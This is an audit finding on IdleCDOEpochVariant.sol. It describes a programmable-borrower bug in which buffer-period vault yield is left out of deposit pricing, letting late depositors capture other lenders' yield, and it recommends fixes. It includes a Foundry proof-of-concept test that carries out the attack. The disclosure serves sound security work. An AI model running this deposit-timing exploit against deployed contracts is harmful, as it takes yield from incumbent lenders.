### Title
Programmable-borrower buffer yield is omitted from deposit pricing, allowing new lenders to capture pre-deposit yield - ([File: contracts/IdleCDOEpochVariant.sol])

### Summary
In programmable-borrower mode, ERC4626 vault gains earned during the buffer period are not settled into CDO NAV before new deposits are priced. A KYC-approved attacker can wait for the programmable borrower’s vault position to appreciate, deposit immediately before `startEpoch`, receive tranches at the stale price, and then claim a pro-rata share of yield that accrued entirely before their deposit.

### Finding Description
`depositAA` reaches `_deposit`, which updates accounting and mints tranche tokens at the current tranche price. [1](#0-0)  For credit vaults, however, `getContractValue` and `_managedContractValue` only include the CDO’s strategy-token balance and raw underlyings, net of `unclaimedFees`; they do not include the programmable borrower’s unrealized ERC4626 vault balance or buffer-period PnL. [2](#0-1) 

The programmable borrower snapshots `bufferStartVaultAssets` when an epoch stops. [3](#0-2)  During the following buffer period, positive vault PnL remains outside CDO NAV until `onStartEpoch` stores it as `bufferedVaultDelta`. [4](#0-3)  That buffered delta is later included in `totalInterestDueNow`, so the next successful `stopEpoch` mints it as strategy-token interest and raises the value of every tranche token, including tokens minted after the yield had already accrued. [5](#0-4) [6](#0-5) 

Calling `_updateAccounting` during the deposit does not fix the stale valuation because the accounting function reads the same strategy-token-only NAV. [7](#0-6)  The attacker also satisfies the only depositor-facing restriction because `_deposit` permits any `isWalletAllowed(msg.sender)` caller while the vault is unpaused between epochs. [8](#0-7) 

### Impact Explanation
If the borrower vault earns `G` during the buffer and the attacker mints `A` tranche tokens out of a final supply of `S`, approximately `G * A / S` of pre-deposit yield is transferred from incumbent lenders to the attacker, before fee and rounding effects. The attacker can subsequently realize the uplift through the normal withdrawal-request flow, making this a direct theft of yield rather than only an incorrect price display.

The same omission can also cause an early withdrawal request during the buffer to be priced without previously accrued vault yield, transferring that residual value to remaining or newly entering lenders. [9](#0-8) 

### Likelihood Explanation
The vulnerable sequence only requires an unprivileged KYC-approved lender, a positive ERC4626 price movement during the buffer, and a deposit before the next `startEpoch`. No borrower misbehavior, privileged action, oracle manipulation, or protocol failure is required. Because buffer yield is deliberately carried into the next epoch, any programmable-borrower deployment whose external vault earns yield between epochs exposes this deposit-time dilution.

### Recommendation
Checkpoint programmable-borrower buffer PnL into CDO NAV before minting new tranche tokens. In particular:

- Add a borrower-side view or settlement hook that exposes `currentVaultAssets - bufferStartVaultAssets` while `epochAccountingActive` is false.
- In `_deposit`, invoke that synchronization before `_updateAccounting` and `_mintSharesAtCurrPrice`; mint corresponding strategy tokens for positive buffer gains in minted-interest mode, or otherwise price the loss before accepting the deposit.
- Apply the same synchronization before `requestWithdraw` and `startEpoch`, or block programmable-mode buffer deposits while an unsynchronized nonzero buffer delta exists.
- Add regression coverage showing that yield accrued before a deposit is allocated only to pre-existing tranche holders.

```solidity
function testBufferVaultYieldCapturedByLateDepositor() external {
    uint256 initialDeposit = 10_000 * oneScale;
    uint256 attackerDeposit = 10_000 * oneScale;
    address attacker = makeAddr("bufferYieldAttacker");

    vm.prank(owner);
    cdoEpoch.setIsInterestMinted(true);

    // Existing lender enters epoch 0.
    idleCDO.depositAA(initialDeposit);
    _startEpochAndCheckPrices(0);

    // Finish epoch 0 normally. ProgrammableBorrower snapshots the vault basis
    // used to measure buffer-period PnL.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    _accrueMorphoVaultInterest();
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);

    uint256 bufferStartAssets = programmableBorrower.bufferStartVaultAssets();
    assertGt(bufferStartAssets, 0, "missing buffer vault baseline");

    // ERC4626 yield accrues while the CDO is in the buffer phase.
    vm.warp(block.timestamp + cdoEpoch.bufferPeriod());
    _accrueMorphoVaultInterest();

    uint256 bufferedGain =
        _programmableVaultAssets() - bufferStartAssets;
    assertGt(bufferedGain, 0, "test requires positive buffer yield");

    // The attacker joins after that yield already exists but before
    // onStartEpoch carries it into pool-facing accounting.
    deal(USDC, attacker, attackerDeposit);
    vm.startPrank(attacker);
    underlying.approve(address(cdoEpoch), attackerDeposit);
    cdoEpoch.depositAA(attackerDeposit);
    vm.stopPrank();

    uint256 attackerShares = aaTranche.balanceOf(attacker);
    uint256 totalShares = aaTranche.totalSupply();
    uint256 expectedCaptured =
        attackerShares * bufferedGain / totalShares;

    assertGt(expectedCaptured, 0, "attacker receives no pre-deposit yield");

    // Run the next epoch and close the pool so the attacker can immediately
    // request and claim the appreciated tranche position.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 1);

    uint256 attackerBalanceBefore = underlying.balanceOf(attacker);
    vm.startPrank(attacker);
    cdoEpoch.requestWithdraw(attackerShares, address(aaTranche));
    cdoEpoch.claimWithdrawRequest();
    vm.stopPrank();

    uint256 payout =
        underlying.balanceOf(attacker) - attackerBalanceBefore;

    // The payout includes the attacker's principal plus at least their share
    // of yield that accrued before they owned any tranches.
    assertGe(
        payout,
        attackerDeposit + expectedCaptured,
        "late depositor did not capture buffered yield"
    );
}
```
